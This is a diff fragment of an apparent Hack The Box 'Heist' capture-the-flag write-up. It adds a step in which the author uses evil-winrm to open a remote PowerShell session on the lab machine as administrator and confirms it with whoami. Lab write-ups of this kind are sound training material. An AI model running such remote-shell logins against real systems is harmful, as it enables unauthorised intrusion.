@@ -359,3 +359,23 @@ C:\Windows\SYSTEM32\ntdll.dll
 C:\Windows\System32
 C:\Windows\SYSTEM32;C:\Windows\system;C:\Windows;
 ```
+We are now the administrator
+
+# Evil-WINRM
+
+```console
+noob2uub@kali:~/ctf/htb/heist$ evil-winrm -i 10.10.10.149 -u administrator
+Enter Password: 
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+supportdesk\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents> 
+```
